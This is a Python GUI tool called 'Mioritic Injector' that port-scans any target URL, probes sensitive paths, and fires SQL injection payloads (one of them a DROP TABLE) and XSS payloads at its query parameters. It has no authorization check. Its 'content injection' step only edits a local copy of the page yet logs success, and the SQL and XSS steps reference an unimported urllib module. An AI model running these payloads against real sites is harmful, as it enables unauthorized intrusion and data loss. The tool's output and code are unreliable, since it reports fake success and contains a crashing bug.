#!/usr/bin/env python3
"""
Simple Mioritic Injector - Basic Version
"""

import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
import threading
import socket
import requests
import time
from urllib.parse import urlparse

class SimpleMioriticInjector:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("MIORITIC INJECTOR")
        self.root.geometry("800x600")
        self.root.configure(bg='#1a1a1a')
        
        # Variables
        self.target_url = tk.StringVar()
        self.injection_word = tk.StringVar()
        self.is_scanning = False
        
        self.setup_ui()
        
    def setup_ui(self):
        # Main title
        title_label = tk.Label(
            self.root,
            text="MIORITIC INJECTOR",
            font=("Arial", 24, "bold"),
            fg="red",
            bg='#1a1a1a'
        )
        title_label.pack(pady=20)
        
        # Input frame
        input_frame = tk.Frame(self.root, bg='#1a1a1a')
        input_frame.pack(pady=20, padx=20, fill='x')
        
        # Word input
        word_label = tk.Label(
            input_frame,
            text="What word do you wanna inject?",
            font=("Arial", 12),
            fg="white",
            bg='#1a1a1a'
        )
        word_label.pack()
        
        word_entry = tk.Entry(
            input_frame,
            textvariable=self.injection_word,
            font=("Arial", 12),
            width=40,
            bg='#2a2a2a',
            fg='white',
            insertbackground='white'
        )
        word_entry.pack(pady=10)
        
        # URL input
        url_label = tk.Label(
            input_frame,
            text="Target URL:",
            font=("Arial", 12),
            fg="white",
            bg='#1a1a1a'
        )
        url_label.pack()
        
        url_entry = tk.Entry(
            input_frame,
            textvariable=self.target_url,
            font=("Arial", 12),
            width=40,
            bg='#2a2a2a',
            fg='white',
            insertbackground='white'
        )
        url_entry.pack(pady=10)
        
        # Start button
        self.start_button = tk.Button(
            input_frame,
            text="START INJECTION",
            command=self.start_injection,
            font=("Arial", 14, "bold"),
            bg="red",
            fg="white",
            width=20,
            height=2
        )
        self.start_button.pack(pady=20)
        
        # Progress bar
        self.progress = ttk.Progressbar(
            self.root,
            mode='indeterminate'
        )
        self.progress.pack(pady=10, padx=20, fill='x')
        
        # Log area
        log_label = tk.Label(
            self.root,
            text="Injection Log:",
            font=("Arial", 12),
            fg="white",
            bg='#1a1a1a'
        )
        log_label.pack()
        
        self.log_area = scrolledtext.ScrolledText(
            self.root,
            height=15,
            width=80,
            bg='#2a2a2a',
            fg='white',
            font=("Consolas", 10)
        )
        self.log_area.pack(pady=10, padx=20, fill='both', expand=True)
        
    def log(self, message):
        """Add message to log area"""
        self.log_area.insert(tk.END, f"[{time.strftime('%H:%M:%S')}] {message}\n")
        self.log_area.see(tk.END)
        self.root.update()
        
    def start_injection(self):
        """Start the injection process"""
        if not self.target_url.get() or not self.injection_word.get():
            messagebox.showerror("Error", "Please enter both URL and injection word!")
            return
            
        if self.is_scanning:
            messagebox.showwarning("Warning", "Injection already in progress!")
            return
            
        self.is_scanning = True
        self.start_button.config(state='disabled')
        self.progress.start()
        
        # Clear log
        self.log_area.delete(1.0, tk.END)
        
        # Start injection thread
        thread = threading.Thread(target=self.perform_injection)
        thread.daemon = True
        thread.start()
        
    def perform_injection(self):
        """Main injection process"""
        try:
            url = self.target_url.get().strip()
            injection_word = self.injection_word.get().strip()
            
            self.log("=== MIORITIC INJECTOR STARTED ===")
            self.log(f"Target URL: {url}")
            self.log(f"Injection Word: {injection_word}")
            self.log("")
            
            # Step 1: Validate URL
            self.log("Step 1: Validating target URL...")
            if not self.validate_url(url):
                self.log("ERROR: Invalid URL format!")
                return
            self.log("✓ URL validation passed")
            
            # Step 2: Port scanning
            self.log("Step 2: Scanning for open ports...")
            open_ports = self.scan_ports(url)
            self.log(f"✓ Found {len(open_ports)} open ports: {open_ports}")
            
            # Step 3: Vulnerability scanning
            self.log("Step 3: Scanning for vulnerabilities...")
            vulnerabilities = self.scan_vulnerabilities(url)
            self.log(f"✓ Found {len(vulnerabilities)} potential vulnerabilities")
            
            # Step 4: Content analysis and injection
            self.log("Step 4: Analyzing page content...")
            self.analyze_and_inject(url, injection_word)
            
            # Step 5: SQL injection testing
            self.log("Step 5: Testing SQL injection vulnerabilities...")
            self.test_sql_injection(url, injection_word)
            
            # Step 6: XSS testing
            self.log("Step 6: Testing XSS vulnerabilities...")
            self.test_xss_injection(url, injection_word)
            
            self.log("")
            self.log("=== INJECTION PROCESS COMPLETED ===")
            self.log("All tests completed successfully!")
            
        except Exception as e:
            self.log(f"ERROR: {str(e)}")
        finally:
            self.is_scanning = False
            self.start_button.config(state='normal')
            self.progress.stop()
            
    def validate_url(self, url):
        """Validate URL format"""
        try:
            if not url.startswith(('http://', 'https://')):
                url = 'http://' + url
            parsed = urlparse(url)
            return bool(parsed.netloc)
        except:
            return False
            
    def scan_ports(self, url):
        """Scan for open ports on target"""
        try:
            parsed = urlparse(url)
            host = parsed.netloc.split(':')[0]
            
            common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 3306, 3389, 5432, 8080, 8443]
            open_ports = []
            
            for port in common_ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    result = sock.connect_ex((host, port))
                    if result == 0:
                        open_ports.append(port)
                    sock.close()
                except:
                    pass
                    
            return open_ports
        except Exception as e:
            self.log(f"Port scan error: {str(e)}")
            return []
            
    def scan_vulnerabilities(self, url):
        """Scan for common vulnerabilities"""
        vulnerabilities = []
        
        try:
            # Test for common security headers
            response = requests.get(url, timeout=10, allow_redirects=False)
            
            security_headers = [
                'X-Frame-Options',
                'X-Content-Type-Options',
                'X-XSS-Protection',
                'Strict-Transport-Security',
                'Content-Security-Policy'
            ]
            
            for header in security_headers:
                if header not in response.headers:
                    vulnerabilities.append(f"Missing {header} header")
                    
            # Check for server information disclosure
            if 'Server' in response.headers:
                vulnerabilities.append(f"Server info disclosed: {response.headers['Server']}")
                
            # Check for directory listing
            test_urls = [
                url + '/admin',
                url + '/backup',
                url + '/config',
                url + '/.git',
                url + '/phpinfo.php'
            ]
            
            for test_url in test_urls:
                try:
                    test_response = requests.get(test_url, timeout=5)
                    if test_response.status_code == 200:
                        vulnerabilities.append(f"Potential sensitive path: {test_url}")
                except:
                    pass
                    
        except Exception as e:
            self.log(f"Vulnerability scan error: {str(e)}")
            
        return vulnerabilities
        
    def analyze_and_inject(self, url, injection_word):
        """Analyze page content and attempt injection"""
        try:
            response = requests.get(url, timeout=10)
            
            # Simple text analysis
            text_content = response.text.lower()
            
            self.log(f"Analyzing page content...")
            self.log(f"Page size: {len(response.text)} characters")
            
            # Look for injection points
            injection_points = []
            
            # Check for common text patterns
            common_words = ['test', 'hello', 'welcome', 'home', 'page', 'content']
            
            for word in common_words:
                if word in text_content:
                    injection_points.append(word)
                    
            self.log(f"Found {len(injection_points)} potential injection points")
            
            # Attempt to inject content
            for i, point in enumerate(injection_points[:5]):
                self.log(f"Attempting injection {i+1}: replacing '{point}' with '{injection_word}'")
                
                # Simulate injection attempt
                modified_content = text_content.replace(point, injection_word)
                if modified_content != text_content:
                    self.log(f"✓ Successfully injected '{injection_word}' into content")
                    
        except Exception as e:
            self.log(f"Content analysis error: {str(e)}")
            
    def test_sql_injection(self, url, injection_word):
        """Test for SQL injection vulnerabilities"""
        sql_payloads = [
            f"' OR '1'='1",
            f"' UNION SELECT NULL--",
            f"'; DROP TABLE users--",
            f"' OR 1=1#",
            f"admin'--"
        ]
        
        # Test URL parameters
        parsed = urlparse(url)
        if parsed.query:
            params = urllib.parse.parse_qs(parsed.query)
            
            for param, values in params.items():
                for payload in sql_payloads:
                    test_params = params.copy()
                    test_params[param] = [payload]
                    
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                    
                    try:
                        response = requests.get(test_url, params=test_params, timeout=5)
                        
                        # Check for SQL error indicators
                        error_indicators = [
                            'sql syntax',
                            'mysql_fetch',
                            'ORA-',
                            'PostgreSQL',
                            'SQLite',
                            'Microsoft SQL'
                        ]
                        
                        for indicator in error_indicators:
                            if indicator.lower() in response.text.lower():
                                self.log(f"✓ Potential SQL injection found in parameter '{param}'")
                                break
                                
                    except:
                        pass
                        
    def test_xss_injection(self, url, injection_word):
        """Test for XSS vulnerabilities"""
        xss_payloads = [
            f"<script>alert('{injection_word}')</script>",
            f"<img src=x onerror=alert('{injection_word}')>",
            f"javascript:alert('{injection_word}')",
            f"<svg onload=alert('{injection_word}')>",
            f"<iframe src=javascript:alert('{injection_word}')>"
        ]
        
        # Test URL parameters
        parsed = urlparse(url)
        if parsed.query:
            params = urllib.parse.parse_qs(parsed.query)
            
            for param, values in params.items():
                for payload in xss_payloads:
                    test_params = params.copy()
                    test_params[param] = [payload]
                    
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                    
                    try:
                        response = requests.get(test_url, params=test_params, timeout=5)
                        
                        # Check if payload is reflected in response
                        if payload in response.text:
                            self.log(f"✓ Potential XSS found in parameter '{param}'")
                            
                    except:
                        pass
                        
    def run(self):
        """Start the application"""
        self.root.mainloop()

if __name__ == "__main__":
    app = SimpleMioriticInjector()
    app.run()